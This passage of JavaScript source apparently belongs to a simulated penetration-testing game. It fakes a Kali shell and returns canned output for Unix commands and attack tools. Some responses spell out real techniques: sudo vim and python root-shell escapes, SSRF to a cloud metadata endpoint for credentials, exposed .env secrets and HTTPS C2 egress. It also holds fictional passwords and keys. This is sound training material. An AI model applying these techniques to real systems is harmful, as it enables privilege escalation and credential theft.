            out: `bash: ${args[idx + 1]}: No such file or directory`,
            handled: true
          };
        ...
        return {
          out: args.map(exp).join(" "),
          handled: true
        };
      }
    case "cd":
      {
        const tgt = ops[0] === "-" ? s.prev || s.cwd : ABS(ops[0] || "~");
        const n = _node(fs, tgt);
        if (!n) return {
          out: `cd: ${ops[0]}: No such file or directory`,
          handled: true
        };
        if (n.t !== "d") return {
          out: `cd: ${ops[0]}: Not a directory`,
          handled: true
        };
        if (!_canExec(n, s.user)) return {
          out: `cd: ${ops[0]}: Permission denied`,
          handled: true
        };
        s.prev = s.cwd;
        s.cwd = tgt;
    ...
    case "ls":
      {
        ...
        const n = _node(fs, tgt);
        if (!n) return {
          out: `ls: cannot access '${ops[0]}': No such file or directory`,
          handled: true
        };
        if (n.t === "f") return {
          out: ops[0],
        ...
        if (!_canRead(n, s.user)) return {
          out: `ls: cannot open directory '${ops[0] || "."}': Permission denied`,
          handled: true
        };
        let names = Object.keys(n.children);
        if (!flags.includes("a")) names = names.filter(x => !x.startsWith("."));else names = [".", "..", ...names];
        names.sort();
        if (flags.includes("l")) {
          const rows = names.map(nm => {
            const c = nm === "." || nm === ".." ? n : n.children[nm];
            const sz = c.t === "f" ? c.content.length : 4096;
            return `${_modeStr(c)} 1 ${c.owner} ${c.owner} ${String(sz).padStart(5)} Nov 15 04:29 ${nm}`;
          });
          return {
    ...
    case "more":
      {
        ...
        const out = [];
        for (const p of ops) {
          const r = read(ABS(p), p.replace(/^.*\//, ""));
          out.push(r.err ? `${cmd}: ${p}: ${r.err}` : r.content.replace(/\n$/, ""));
        }
        return {
          out: out.join("\n"),
          handled: true
    ...
    case "tail":
      {
        ...
        const nArg = (args.find(a => /^-\d+$/.test(a)) || "").slice(1);
        const N = nArg ? parseInt(nArg) : 10;
        const L = fi.text.split("\n");
        return {
          out: (cmd === "head" ? L.slice(0, N) : L.slice(-N)).join("\n"),
          handled: true
        };
      }
    case "wc":
      {
        ...
        const txt = fi.text;
        const ln = txt === "" ? 0 : txt.split("\n").length,
          w = (txt.match(/\S+/g) || []).length,
          c = txt.length + (txt ? 1 : 0);
        if (flags.includes("l")) return {
          out: `${ln}`,
          handled: true
        };
        if (flags.includes("w")) return {
          out: `${w}`,
          handled: true
        };
        const tag = ops.length ? ` ${ops[ops.length - 1]}` : "";
        return {
          out: `${String(ln).padStart(7)}${String(w).padStart(8)}${String(c).padStart(8)}${tag}`,
          handled: true
        };
      }
    case "grep":
      {
        ...
        const cnt = flags.includes("c");
        if (pat == null) return {
          out: "usage: grep PATTERN [FILE]",
          handled: true
        };
        const re = new RegExp(pat.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), ic ? "i" : "");
        const hits = [];
        if (!rec && ops.length < 2 && stdin != null) {
          stdin.replace(/\n$/, "").split("\n").forEach((l, i) => {
            if (re.test(l) !== inv) hits.push((num ? i + 1 + ":" : "") + l);
          });
          return {
            out: cnt ? String(hits.length) : hits.join("\n"),
            handled: true
          };
        }
        const scan = path => {
          const node = _node(fs, path);
          if (!node) return;
          if (node.t === "f") {
            if (!_canRead(node, s.user)) return;
            node.content.split("\n").forEach((l, i) => {
              if (re.test(l) !== inv) hits.push((rec ? path + ":" : "") + (num ? i + 1 + ":" : "") + l);
            });
          } else if (rec) {
            for (const k of Object.keys(node.children)) scan(path + "/" + k);
          }
        };
        if (!rec && !ops[1]) return {
          out: "usage: grep PATTERN FILE",
    ...
    case "base64":
      {
        ...
        const dec = flags.includes("d") || flags.includes("D");
        try {
          if (dec) {
            return {
              out: _b64dec(fi.text.replace(/\s+/g, "")),
              handled: true
            };
          }
          return {
    ...
    case "tr":
      {
        const txt = (stdin != null ? stdin : "").replace(/\n$/, "");
        const A = ops[0] || "",
          B = ops[1] || "";
        const expand = set => {
          let out = "";
        ...
        if (flags.includes("d")) {
          const del = new Set(expand(A));
          return {
            out: txt.split("").filter(ch => !del.has(ch)).join(""),
            handled: true
          };
        }
        const from = expand(A),
        ...
        return {
          out: txt.split("").map(ch => map[ch] ?? ch).join(""),
          handled: true
        };
      }
    case "sort":
      {
        ...
        let L = fi.text === "" ? [] : fi.text.split("\n");
        const num = flags.includes("n");
        const rev = flags.includes("r");
        L = L.slice().sort((a, b) => num ? (parseFloat(a) || 0) - (parseFloat(b) || 0) : a.localeCompare(b));
        if (rev) L.reverse();
        return {
          out: L.join("\n"),
          handled: true
    ...
    case "uniq":
      {
        ...
        for (const l of L) {
          if (l === prev) {
            ...
            if (prev !== null) out.push(cnt ? `${String(run).padStart(7)} ${prev}` : prev);
            prev = l;
            run = 1;
          }
        }
    ...
    case "cut":
      {
        ...
        let delim = di >= 0 ? args[di + 1] : flags.includes("d") ? "\t" : "\t";
        const dm = line.match(/-d\s*'([^']*)'|-d\s*"([^"]*)"|-d\s*(\S)/);
        if (dm) delim = dm[1] ?? dm[2] ?? dm[3];
        const fm = line.match(/-f\s*(\S+)/);
        const fields = fm ? fm[1].split(",").map(Number) : [1];
        return {
          out: fi.text.split("\n").map(l => {
    ...
    case "sha256sum":
      {
        ...
        return {
          out: `${_pseudohash(fi.text, cmd)}  ${ops[0] || "-"}`,
          handled: true
        };
      }
    case "sleep":
    ...
    case "date":
      return {
        out: "Sun Nov 15 04:29:55 UTC 2026",
        handled: true
      };
    case "find":
      {
        const start = ABS(ops[0] || ".");
        const ni = args.indexOf("-name");
        const want = ni >= 0 ? args[ni + 1] : null;
        const res = [];
        const walk = path => {
          const node = _node(fs, path);
          if (!node) return;
          const base = path.split("/").pop() || "/";
          const rx = want && new RegExp("^" + want.replace(/\./g, "\\.").replace(/\*/g, ".*") + "$");
          if (!want || base === want || rx && rx.test(base)) res.push(path);
          if (node.t === "d" && _canRead(node, s.user)) for (const k of Object.keys(node.children)) walk(path === "/" ? "/" + k : path + "/" + k);
        };
        walk(start);
        return {
          out: res.join("\n"),
    ...
    case "mkdir":
      {
        for (const p of ops) {
          ...
          if (flags.includes("p")) {
            let n = fs;
            for (const part of _split(t)) {
              if (!n.children[part]) n.children[part] = _d({}, s.user);
              n = n.children[part];
            }
            continue;
          }
          ...
          if (!parent) return {
            out: `mkdir: cannot create '${p}': No such file or directory`,
            handled: true
          };
          if (parent.children[name]) return {
            out: `mkdir: cannot create directory '${p}': File exists`,
            handled: true
          };
          parent.children[name] = _d({}, s.user);
        }
        return {
          out: "",
          handled: true
    ...
    case "touch":
      {
        for (const p of ops) {
          ...
          if (!parent) return {
            out: `touch: cannot touch '${p}': No such file or directory`,
            handled: true
          };
          if (!parent.children[name]) parent.children[name] = _f("", s.user);
        }
        return {
          out: "",
          handled: true
    ...
    case "rm":
      {
        ...
        const nuke = ops.some(p => {
          const a = ABS(p);
          return a === "/" || p === "/*" || a === "/home/stranger" || a === "/home" || p === "~" || p === "~/";
        });
        if (rf && nuke) return {
          selfDestruct: true,
          handled: true
        ...
        for (const p of ops) {
          ...
          if (!parent || !parent.children[name]) {
            ...
            return {
              out: `rm: cannot remove '${p}': No such file or directory`,
              handled: true
            };
          }
          if (parent.children[name].t === "d" && !flags.includes("r")) return {
            out: `rm: cannot remove '${p}': Is a directory`,
            handled: true
          };
    ...
    case "rmdir":
      {
        for (const p of ops) {
          ...
          if (!parent || !parent.children[name]) return {
            out: `rmdir: failed to remove '${p}': No such file or directory`,
            handled: true
          };
          if (Object.keys(parent.children[name].children || {}).length) return {
            out: `rmdir: failed to remove '${p}': Directory not empty`,
            handled: true
          };
          delete parent.children[name];
        }
    ...
    case "mv":
      {
        if (ops.length < 2) return {
          out: `${cmd}: missing destination operand`,
          handled: true
        };
        const src = _node(fs, ABS(ops[0]));
        if (!src) return {
          out: `${cmd}: cannot stat '${ops[0]}': No such file or directory`,
          handled: true
        };
        const {
          parent,
          name
        } = _parent(fs, ABS(ops[1]));
        if (!parent) return {
          out: `${cmd}: cannot create '${ops[1]}'`,
          handled: true
        };
        parent.children[name] = JSON.parse(JSON.stringify(src));
        if (cmd === "mv") {
          const sp = _parent(fs, ABS(ops[0]));
    ...
    case "chmod":
      {
        const m = ops[0];
        const n = _node(fs, ABS(ops[1]));
        if (!n) return {
          out: `chmod: cannot access '${ops[1]}': No such file or directory`,
          handled: true
        };
        if (/^[0-7]{3}$/.test(m)) n.mode = m;
        return {
          out: "",
          handled: true
        };
    ...
    case "stat":
      {
        const n = _node(fs, ABS(ops[0]));
        if (!n) return {
          out: `stat: cannot stat '${ops[0]}': No such file or directory`,
          handled: true
        };
        return {
          out: `  File: ${ops[0]}\n  Type: ${n.t === "d" ? "directory" : "regular file"}\nAccess: (0${n.mode}/${_modeStr(n)})  Uid: ${n.owner}`,
          handled: true
        };
      }
    case "file":
      {
        const n = _node(fs, ABS(ops[0]));
        if (!n) return {
          out: `${ops[0]}: cannot open \`${ops[0]}'`,
          handled: true
        };
        return {
          out: `${ops[0]}: ${n.t === "d" ? "directory" : "ASCII text"}`,
          handled: true
        };
      }
    case "su":
      {
        const who = ops[0] || "root";
        if (who !== "root") return {
          out: `su: user ${who} does not exist`,
          handled: true
        };
        if (s.user === "root") return {
          out: "",
          handled: true
        };
        s.pending = "su:root";
    ...
    case "sudo":
      {
        if (args.join(" ").includes("-l")) return {
          out: `User ${s.user} may run the following commands on axiom-kali:\n  (ALL) NOPASSWD: /usr/bin/vim\n  (ALL) NOPASSWD: /usr/bin/python3`,
          handled: true
        };
        return {
          out: "[sudo] find the root password in the filesystem, then: su root",
          handled: true
        };
      }
    case "reboot":
    case "shutdown":
      {
        if (s.user !== "root") return {
          out: `${cmd}: Operation not permitted (you are not root)`,
          handled: true
        };
        return {
          out: "",
...
function engine(fs, s, raw) {
  ...
  if (pipeline.length > 1) {
    const allReal = pipeline.every(seg => {
      const c = (seg.match(/^\S+/) || [])[0];
      return OS_CMDS.has(c);
    });
    if (allReal) {
      let data = null,
        last = {
      ...
      for (const seg of pipeline) {
        last = osRun(fs, s, seg, data == null ? "" : data);
        if (last.clear || last.reboot || last.selfDestruct) return last;
        data = last.out != null ? last.out : "";
      }
      return {
        out: data
      };
    ...
    if (sim.output === "__CLEAR__") return {
      out: "",
      clear: true
    };
    if (sim.output === "__ESCAPE_KEY__") return {
      out: "__ESCAPE_KEY__",
      escape: true,
      keyEnding: true
    };
    if (sim.output === "__ESCAPE__") return {
      out: "__ESCAPE__",
      escape: true
    };
...
function simCommand(raw, cwd) {
  ...
  if ((cmd === "cat" || cmd === "less" || cmd === "more" || cmd === "head" || cmd === "tail") && args[0]) {
    ...
    if (VFILES[norm]) return {
      output: VFILES[norm],
      newCwd: cwd
    };
    if (fname === "escape.sh" || norm.includes("escape.sh")) return {
      output: VFILES["/sys/firewall/escape.sh"],
      newCwd: cwd
    };
    return {
      output: `cat: ${args[args.length - 1]}: No such file or directory\n(Try ls to see available files)`,
      newCwd: cwd
    };
  }
  if (cmd === "pwd") return {
  ...
  if (cmd === "hostname") return {
    output: "axiom-kali",
    newCwd: cwd
  };
  if (cmd === "id") return {
    output: "uid=1000(stranger) gid=1000(stranger) groups=1000(stranger),4(adm),27(sudo)",
    newCwd: cwd
  };
  if (cmd === "uptime") return {
    output: " 04:32:17 up 847 days, 11:04, 1 user, load average: 0.08, 0.03, 0.01",
    newCwd: cwd
  };
  if (cmd === "uname") return {
    output: args.includes("-a") ? "Linux axiom-kali 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-2kali1 x86_64 GNU/Linux" : "Linux",
    newCwd: cwd
  };
  if (cmd === "who" || cmd === "w") return {
    output: "stranger  pts/0  2024-11-15 04:29 (10.0.0.1)",
    newCwd: cwd
  };
  if (cmd === "last") return {
    output: "stranger  pts/0  10.0.0.1  Fri Nov 15 04:29  still logged in\nroot      tty1            Mon Jan 15 00:00 - down (847 days ago)\nwtmp begins Fri Jan 15 2021",
    newCwd: cwd
  };
  if (cmd === "groups") return {
    output: "stranger adm sudo netdev bluetooth",
    newCwd: cwd
  };
  if (cmd === "env") return {
    output: "USER=stranger\nHOME=/home/stranger\nSHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nAXIOM_KEY=xK8#mP2@nQ5$\nDB_HOST=10.0.0.10\nTERM=xterm-256color",
    newCwd: cwd
  };
  if (cmd === "echo") return {
    output: args.join(" ").replace(/\$(\w+)/g, (_, v) => ({
  ...
  if (cmd === "export" || cmd === "alias") return {
    output: "",
    newCwd: cwd
  };
  if (cmd === "which") return {
    output: args[0] ? `/usr/bin/${args[0]}` : "Usage: which <cmd>",
    newCwd: cwd
  };
  if (cmd === "locate") return {
    output: args[0] ? `/usr/share/${args[0]}\n/home/stranger/.local/${args[0]}` : "Usage: locate <file>",
    newCwd: cwd
  };
  if (cmd === "history") return {
    output: "(Command history shown above — use ↑↓ arrows to navigate)",
    newCwd: cwd
  };
  if (cmd === "cd") {
    if (!args[0] || args[0] === "~") return {
      output: "",
      newCwd: "/home/stranger"
    };
    if (args[0] === "-") return {
      output: cwd,
      newCwd: cwd
    ...
    const valid = ["/", "/home", "/home/stranger", "/home/stranger/Documents", "/home/stranger/Desktop", "/home/stranger/workspace", "/etc", "/etc/network", "/var", "/var/log", "/var/www", "/var/www/html", "/opt", "/opt/recon", "/opt/scan", "/opt/exploit", "/opt/active-directory", "/proc", "/proc/1", "/sys", "/sys/firewall", "/sys/net", "/etc/crypto", "/etc/defense", "/usr", "/usr/share", "/tmp", "/root"];
    if (valid.some(v => norm.startsWith(v))) return {
      output: "",
      newCwd: norm
    };
    return {
  ...
  if (cmd === "cp" || cmd === "mv") return {
    output: args.length >= 2 ? "" : `${cmd}: missing operand`,
    newCwd: cwd
  };
  if (cmd === "chmod" || cmd === "chown") return {
    output: "",
    newCwd: cwd
  };
  if (cmd === "wc") return {
    output: args[0] ? `      42     312    2048 ${args[args.length - 1]}` : "Usage: wc [options] <file>",
    newCwd: cwd
  };
  if (cmd === "sort") return {
  ...
  if (cmd === "cut") return {
    output: args.includes("/etc/passwd") ? "root\ndaemon\nwww-data\nstranger\nmysql\nsvc_backup" : "(fields extracted)",
    newCwd: cwd
  };
  if (cmd === "file") return {
    output: args[0] ? `${args[0]}: ASCII text` : "Usage: file <path>",
    newCwd: cwd
  };
  if (cmd === "strings") return {
    output: args[0] ? `/lib/libc.so.6\nELF\nAxiom Systems Binary v2.1\npassword=\nAxiom2024!\n10.0.0.100\ncorp.axiom.local\n[!] Interesting strings found in binary!` : "Usage: strings <file>",
    newCwd: cwd
  };
  if (cmd === "xxd" || cmd === "hexdump") return {
    output: "00000000: 7f45 4c46 0201 0100  .ELF....\n00000008: 0000 0000 0000 0000  ........",
    newCwd: cwd
  };
  if (cmd === "dd") return {
    output: args.length ? "22548578304 bytes (23 GB) copied, 47.3 s, 477 MB/s" : "Usage: dd if=<src> of=<dst>",
    newCwd: cwd
  };
  if (cmd === "grep") {
    ...
    if (lp.includes("password") || lp.includes("pass")) {
      return {
        output: `/home/stranger/.bashrc:export AXIOM_KEY="xK8#mP2@nQ5$"\n/home/stranger/.bash_history:mysql -h 10.0.0.10 -u root -pAxiom2021!\n/var/www/html/config.php:$db_pass = 'W3bC0nf!g2024';\n(3 results — credentials found)`,
        newCwd: cwd
      };
    }
    if (lp.includes("failed") || lp.includes("fail")) {
      return {
        output: `Nov 15 04:01:11 axiom-kali sshd: Failed password for root from 185.220.101.47\n[... 46,922 more entries ...]\n185.220.101.47     46923   ← botnet/tor exit node`,
        newCwd: cwd
      };
    }
    if (lp.includes("stranger") || lp.includes("1000")) {
      return {
        output: `stranger:x:1000:1000:,,,:/home/stranger:/bin/bash`,
        newCwd: cwd
      };
    }
    return {
      output: `(searched for '${pattern}' — no matches, or try a more specific pattern)`,
      newCwd: cwd
    };
  }
  if (cmd === "awk") {
    if (input.includes("passwd")) return {
      output: "root\ndaemon\nwww-data\nstranger\nmysql\nsvc_backup",
      newCwd: cwd
    };
    if (input.includes("print $11") || input.includes("uniq -c")) return {
      output: "185.220.101.47   46923\n10.10.10.15          3\n(Sorted by frequency — 185.220.101.47 is your attacker)",
      newCwd: cwd
    };
    return {
      output: "(awk: pattern applied to input)",
      newCwd: cwd
    };
  }
  if (cmd === "sed") return {
    output: "(sed: substitution applied)",
    newCwd: cwd
  };
  if (cmd === "find") {
    ...
    if (perm && (perm.includes("s") || perm.includes("4000") || perm.includes("u=s"))) {
      return {
        output: "/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/vim\n/usr/bin/python3\n/usr/bin/find\n/bin/ping\n/usr/lib/openssh/ssh-keysign\n\n[!] vim, python3, find all have SUID — check gtfobins.txt!",
        newCwd: cwd
      };
    }
    if (name) {
      ...
      const m = {
        ...
        bak: "/var/backup/server.conf.bak\n/var/backup/db_dump.sql.bak",
        php: "/var/www/html/index.php\n/var/www/html/config.php\n/var/www/html/login.php",
        txt: "/home/stranger/Documents/notes.txt\n/opt/recon/methodology.txt\n/sys/firewall/rules.txt",
        sh: "/opt/scripts/backup.sh\n/sys/firewall/escape.sh"
      };
      return {
        output: m[ext] || `(files matching '${name}' — check common locations)`,
        newCwd: cwd
      };
    }
    return {
      output: "(find: specify -name or -perm filter)",
      newCwd: cwd
    };
  }
  if (cmd === "sudo") {
    const sub = args.join(" ");
    if (sub.includes("-l")) return {
      output: "User stranger may run the following commands on axiom-kali:\n  (ALL) NOPASSWD: /usr/bin/vim\n  (ALL) NOPASSWD: /usr/bin/python3",
      newCwd: cwd
    };
    if (sub.startsWith("vim")) return {
      output: "[sudo] Running vim as root\n(Real usage: sudo vim -c ':!/bin/bash' gives root shell)\n[Simulated: root shell obtained — you have root]",
      newCwd: cwd
    };
    if (sub.startsWith("python")) return {
      output: "[sudo] Running python3 as root\n>>> import os; os.system('/bin/bash')\n[Simulated: root shell obtained]",
      newCwd: cwd
    };
    return {
      output: "[sudo] password for stranger: ",
      newCwd: cwd
    };
  }
  if (cmd === "su") return {
    output: args[0] === "root" ? "Password:\nsu: Authentication failure" : `su: user ${args[0] || "root"} does not exist`,
    newCwd: cwd
  };
  if (cmd === "systemctl") {
    if (args[0] === "list-units" || args[0] === "list-unit-files") return {
  ...
  if (cmd === "ip") {
    ...
    if (args[0] === "link") return {
      output: "1: lo: <LOOPBACK,UP>\n   link/loopback 00:00:00:00:00:00\n2: eth0: <BROADCAST,MULTICAST,UP>\n   link/ether 08:00:27:ab:12:34",
      newCwd: cwd
    };
    return {
      output: "Usage: ip [addr|route|link|neigh]",
      newCwd: cwd
    };
  }
  if (cmd === "ifconfig") return {
  ...
  if (cmd === "ping") {
    ...
    if (!tgt) return {
      output: "Usage: ping [-c count] <host>",
      newCwd: cwd
    };
    if (!known.includes(tgt)) return {
      output: `connect: Network is unreachable (firewall blocks egress to ${tgt})`,
      newCwd: cwd
    };
    const lines = Array.from({
      length: cnt
    }, (_, i) => `64 bytes from ${tgt}: icmp_seq=${i + 1} ttl=64 time=${(Math.random() * 2 + 0.3).toFixed(2)} ms`);
    return {
      output: `PING ${tgt}: 56 bytes\n${lines.join("\n")}\n--- ${tgt} ping stats ---\n${cnt} packets transmitted, ${cnt} received, 0% packet loss`,
      newCwd: cwd
    };
  }
  if (cmd === "traceroute" || cmd === "tracepath") return {
    output: `traceroute to ${args[0] || "?"} (${args[0] || "?"}), 30 hops max\n 1  10.0.0.1 (gateway)  0.42 ms\n 2  * * * (firewall drops ICMP after hop 1)\n(AXIOM-SECURE-V3 blocks further tracing)`,
    newCwd: cwd
  };
  ...
  if (cmd === "curl") {
    ...
    if (url.includes("169.254.169.254")) return {
      output: "{\n  \"AccessKeyId\": \"ASIA4EXAMPLE3KEYID\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMIK7EXAMPLE\",\n  \"Token\": \"AQoDYXdzEJr...\"\n}\n\n[!] AWS IAM credentials exposed via SSRF to metadata endpoint!",
      newCwd: cwd
    };
    if (url.includes("robots.txt")) return {
      output: "User-agent: *\nDisallow: /admin\nDisallow: /backup\nDisallow: /internal\nDisallow: /.env\nDisallow: /api/v1\n\n[!] Disallowed paths tell attackers exactly where to look!",
      newCwd: cwd
    };
    if (url.includes("/admin") && args.includes("-d") && input.includes("admin'")) return {
    ...
    if (url.includes("/fetch.php") || url.includes("localhost/admin")) return {
      output: "HTTP/1.1 200 OK\n\n[SSRF] Server fetched: http://localhost/admin\nReturned internal admin page — bypassed external access controls!\n\n[!] SSRF confirmed — server will fetch any URL you provide",
      newCwd: cwd
    };
    if (url.includes("/.env")) return {
      output: "DB_HOST=localhost\nDB_USER=root\nDB_PASS=AxiomDB2024!\nAPP_SECRET=xK8#mP2@nQ5$\nAWS_KEY=AKIA4EXAMPLE\n\n[!] .env file publicly accessible — all application secrets exposed!",
      newCwd: cwd
    };
    if (isHead) return {
    ...
    if (url.includes("https://")) return {
      output: "HTTP/1.1 200 OK\nStrict-Transport-Security: max-age=31536000\n\n(HTTPS egress works — port 443 allowed by firewall)\n\n[!] Useful: HTTPS C2 on port 443 would bypass AXIOM firewall",
      newCwd: cwd
    };
    return {
  ...
  if (cmd === "wget") return {
    output: args[0] ? `--2024-11-15 04:32:17-- ${args[0]}\nResolving... done.\nHTTP request sent... 200 OK\nSaved: '${args[0].split("/").pop()}'` : "Usage: wget <url>",
    newCwd: cwd
  };
  if (cmd === "nc" || cmd === "netcat") {
    ...
    if (host) {
      const services = {
        ...
        "25": "220 mail.axiom.local ESMTP",
        "80": "HTTP/1.0 400 Bad Request",
        "3306": "MySQL 5.7.42"
      };
      return {
        output: services[port] || `Connection to ${host} ${port} port [tcp/*] succeeded!`,
        newCwd: cwd
      };
    }
    return {
      output: "Usage: nc [-lvnp port] or nc [host] [port]",
      newCwd: cwd
    };
  }
  if (cmd === "nmap") {
  ...
  if (cmd === "hash-identifier") return {
    output: `Enter hash: (paste hash)\n\nPossible hash: MD5\nAlso possible: NTLM (same length, different format)\n(Use hashcat --example-hashes to verify)`,
    newCwd: cwd
  };
  if (cmd === "msfconsole") return {
    output: `\n     ,           ,\n    /(\`--')----/(\`--')\n   =[   D[)]   =[   D[)]\n\nMetasploit Framework v6.3.44\n\nmsf6 > (search, use, show options, set RHOSTS, run)\nTip: search type:exploit platform:linux`,
    newCwd: cwd
  };
  if (cmd === "search" || cmd === "use" || cmd === "show" || cmd === "set" || cmd === "run" || cmd === "exploit") {
    const msf = {
      ...
      use: `[*] Using module. Set options with: show options`,
  ...
  if (cmd === "sysinfo" || cmd === "getuid" || cmd === "getsystem" || cmd === "hashdump") {
    const m = {
      sysinfo: "Computer  : AXIOM-TARGET\nOS        : Linux 5.4.0 Ubuntu 20.04\nArch      : x64\nMeterpreter: x64/linux",
      getuid: "Server username: www-data (UID 33)",
      getsystem: "[+] Got system via technique 1 (Linux sudo/SUID exploitation).\n[+] Now running as: root",
      hashdump: "root:$6$random$Kc4.UXBMs7nVeEm8...:18628:0:99999:7:::\nstranger:$6$salt$hash...:18628:0:99999:7:::\nsvc_backup:$6$othersalt$otherhash...:18628:0:99999:7:::"
    };
    return {
      output: m[cmd] || "ok",
      newCwd: cwd
  ...
  if (cmd === "msfvenom") {
    if (args.includes("-l")) return {
      output: "linux/x64/shell_reverse_tcp\nlinux/x64/meterpreter/reverse_tcp\nwindows/x64/meterpreter/reverse_tcp\nphp/meterpreter_reverse_tcp\npython/meterpreter/reverse_tcp\n(... many more)",
      newCwd: cwd
    };
  ...
  if (cmd === "searchsploit") {
    if (args.includes("-m")) return {
      output: `  Copied to: /home/stranger/${args[args.indexOf("-m") + 1]}.py`,
      newCwd: cwd
    };
    const terms = args.filter(a => !a.startsWith("-")).join(" ") || "Apache";
    return {
      output: `Exploit Title                                         | Path\n------------------------------------------------------\n${terms} 2.4.49 Path Traversal RCE (CVE-2021-41773)  | webapps/50383.py\n${terms} mod_cgi RCE                                   | linux/remote/21.sh\n\n[!] Use: searchsploit -m 50383 to copy to current dir`,
      newCwd: cwd
    };
  }
  if (cmd === "airmon-ng") return {
    output: args[0] === "start" ? "PHY  Interface  Driver    Chipset\nphy0 wlan0      ath9k_htc AR9271\n\nPHY  Interface  Driver    Chipset\nphy0 wlan0mon   ath9k_htc AR9271 (monitor mode enabled)" : "Usage: airmon-ng start|stop <interface>",
    newCwd: cwd
  };
  if (cmd === "airodump-ng") return {
    output: "BSSID              PWR  Beacons  CH  ENC  ESSID\nAA:BB:CC:DD:EE:FF  -41  24        6  WPA2 AxiomCorpWifi\n11:22:33:44:55:66  -72  8         1  WPA2 HomeNetwork_2.4\n\nSTATION            BSSID              PWR  Frames\nC8:94:02:11:22:33  AA:BB:CC:DD:EE:FF  -30  47",
    newCwd: cwd
  };
  if (cmd === "aireplay-ng") return {
    output: args.includes("--deauth") ? "04:32:17 Sending 10 directed DeAuth frames\n04:32:17 Deauth sent — forcing reconnection\n04:32:18 WPA2 handshake captured!" : "Usage: aireplay-ng --deauth N -a BSSID <interface>",
    newCwd: cwd
  };
  if (cmd === "aircrack-ng") return {
    output: "Opening capture.cap\n\n[00:04:13] 2847832/14344391 keys tested\n\n     KEY FOUND! [ password123 ]\n\nMaster Key: 2B 3C 4D 5E...",
    newCwd: cwd
  };
  if (cmd === "arpspoof") return {
    output: args.length ? `Intercepting traffic between ${args[args.indexOf("-t") + 1] || "?"} and ${args[args.length - 1] || "?"}\nARP replies being sent... (IP forwarding required)` : "Usage: arpspoof -i eth0 -t <target> <gateway>",
    newCwd: cwd
  };
  if (cmd === "ettercap") return {
    output: "ettercap NG-0.8.3\n\nARP poisoning victims:\n GROUP 1: 10.0.0.1\n GROUP 2: 10.0.0.50\n\nStarting Unified sniffing... MITM active.\nCapturing: POST /login.php username=admin&password=CorpPass2021",
    newCwd: cwd
  };
  if (cmd === "mitmproxy") return {
    output: "mitmproxy v10.0\n\nListening on 0.0.0.0:8080\n\n[Intercepted]\nGET http://10.0.0.10/ HTTP/1.1\n← 200 OK 2847 bytes\n\n[Intercepted]\nPOST http://10.0.0.10/admin/login.php\n  username=admin\n  password=CorpPass2021\n← 302 Found",
    newCwd: cwd
  };
  if (cmd === "dnschef") return {
    output: "[*] DNSChef started — DNS cache poisoning active\n[*] Faking all queries to point to 10.0.0.50\n[*] target.com → 10.0.0.50 (your machine)\n[*] Poisoning the resolver: clients cache the forged record\n[*] Every client on this segment now connects to you",
    newCwd: cwd
  };
  if (cmd === "hcitool") return {
    output: args[0] === "scan" ? "Scanning...\n  AA:BB:CC:11:22:33  TDK Life On Record\n  DD:EE:FF:44:55:66  Microsoft Bluetooth Mouse\n  11:22:33:44:55:66  [unknown]" : args[0] === "lescan" ? "LE Scan...\nAA:BB:CC:DD:EE:01 (unknown)\n11:22:33:44:55:66 AxiomWatch\nC8:94:02:11:22:33 (unknown)" : "Usage: hcitool scan|lescan|dev",
    newCwd: cwd
  };
  if (cmd === "btscanner") return {
    output: "btscanner 2.1\n\nDevice: AA:BB:CC:11:22:33\n  Name: TDK Speaker\n  Class: Audio/Video — Loudspeaker\n\nDevice: DD:EE:FF:44:55:66\n  Name: Wireless Keyboard\n  Class: Peripheral — Keyboard\n  [!] HID device — keystrokes may be sniffable unencrypted!",
    newCwd: cwd
  };
  if (cmd === "openssl") {
    if (args[0] === "s_client" || input.includes("s_client")) return {
    ...
    if (args[0] === "enc") return {
      output: args.includes("-d") ? "(file decrypted successfully)" : "(file encrypted with AES-256-CBC)",
      newCwd: cwd
    };
    return {
      output: "Usage: openssl [s_client|enc|dgst|genrsa|req|x509]",
      newCwd: cwd
    };
  }
  if (cmd === "gpg") return {
    output: args.includes("--symmetric") ? "Enter passphrase: ***\nFile encrypted." : "Usage: gpg --symmetric <file>",
    newCwd: cwd
  };
  if (cmd === "binwalk") return {
    output: args[0] ? `DECIMAL   HEXADECIMAL  DESCRIPTION\n0         0x0          JPEG image data\n182736    0x2CA50      Zip archive data, compressed\n\n[!] Embedded ZIP found — run: binwalk -e ${args[0]}` : "Usage: binwalk <file>",
    newCwd: cwd
  };
  if (cmd === "steghide") return {
    output: args.includes("extract") ? "Enter passphrase: \nwrote extracted data to 'hidden_key.txt'\n\nContents: private RSA key + note:\n'access.axiom-systems.com — emergency use only.'\n\n[!] Private key extracted from image metadata!" : "Usage: steghide extract -sf <image>",
    newCwd: cwd
  };
  if (cmd === "exiftool") return {
    output: args[0] ? `File Name: ${args[0]}\nFile Type: JPEG\nImage Width: 1920\nImage Height: 1080\nGPS Latitude: 53° 21' N\nGPS Longitude: 6° 15' W\nAuthor: J. Richardson\nCamera Model: iPhone 13 Pro\nCreate Date: 2024:09:12 14:32:11\n\n[!] GPS coords embedded — location discoverable\n[!] Author: J. Richardson (VP Infrastructure)` : "Usage: exiftool <file>",
    newCwd: cwd
  };
  if (cmd === "dd") return {
    output: args.length ? "22548578304 bytes (23 GB) copied, 47.3 s, 477 MB/s\n(disk.img created)" : "Usage: dd if=<src> of=<dst> bs=<size>",
    newCwd: cwd
  };
  if (cmd === "foremost") return {
    output: "Processing: disk.img\n\nRecovered files:\n  00000001.docx (Word document)\n  00000002.jpg  (JPEG image)\n  00000003.txt  (ASCII text) ← chat_log_2024_08.txt\n\n[!] Deleted file recovered: chat_log_2024_08.txt\nContents: two people planning an operation, 6 weeks ago.",
    newCwd: cwd
  };
  if (cmd === "fls") return {
    output: "d/d 2: .\nr/r 18: welcome.txt\nr/r 22: .bash_history\nr/r * 31: chat_log_2024_08.txt (DELETED — recoverable!)\n(r/r * = deleted but recoverable)",
    newCwd: cwd
  };
  if (cmd === "volatility") return {
    output: args.length ? `Volatility 3 Framework\nPID   Name      PPID  Cmd\n1     systemd   0\n892   sshd      1\n1847  axiom-daemon 1    /opt/axiom/axiom-daemon --key=AxiomM4sterK3y!\n4471  bash      892\n\n[!] axiom-daemon has decryption key in cmdline: AxiomM4sterK3y!` : "Usage: volatility -f memory.raw <plugin>",
